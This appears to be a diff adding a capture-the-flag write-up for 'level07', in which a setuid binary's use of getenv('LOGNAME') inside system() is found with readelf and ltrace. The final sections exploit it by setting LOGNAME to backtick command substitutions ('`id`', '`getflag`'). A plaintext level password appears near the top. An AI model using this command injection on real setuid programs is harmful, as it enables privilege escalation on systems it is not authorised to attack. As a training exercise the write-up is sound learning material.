@@ -1,1 +1,71 @@
-# 07 - Todo
+# 07 
+
+Login
+
+```b
+> ssh level07@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: wiok45aaoguiboiki2tuin6ub
+> ls -l
+-rwsr-sr-x 1 flag07 level07 8805 level07
+```
+
+First thought:
+  - options: (not running it, just to see what it _prints_)
+
+```b
+> file level07
+> strings level07
+> xxd level07 | grep level
+> xxd level07 | grep -A3 -B3 level
+> readelf -s ./level07 | grep -E 'getenv|system|exec|echo|puts|write|printf'
+> objdump -d level07 | grep -E "getenv|system|exec|echo|puts|write|printf"
+                      regex ^^
+```
+
+Using `readelf -p .rodata` and `ltrace`
+- `-p` : `string-dump` displays contents of a section as printable str
+- `.rodata` : `read-only data` section = what we want to see
+
+```b
+> readelf -p .rodata ./level07 
+String dump of section '.rodata':
+  [     8]  LOGNAME
+            ^^^^^^^ 🟡 
+  [    10]  /bin/echo %s 
+```
+```b
+> ltrace ./level07
+
+__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                  = 2007
+geteuid()                                                  = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
+getenv("LOGNAME")                                          = "level07"
+        ^^^^^^^ 🟡 
+asprintf(0xbffff744, 0x8048688, 0xbfffff4b, 0xb7e5ee55, 0xb7fed280) = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                     = 0
++++ exited (status 0) +++
+```
+
+Run it and we found that it prints `LOGNAME`
+
+```b
+> ./level07 whoami
+level07
+> man env
+> env logname
+level06
+> export LOGNAME='`id`'
+> ./level07 
+uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
+```
+
+Solution
+```b
+> export LOGNAME='`getflag`'
+> ./level07
+```
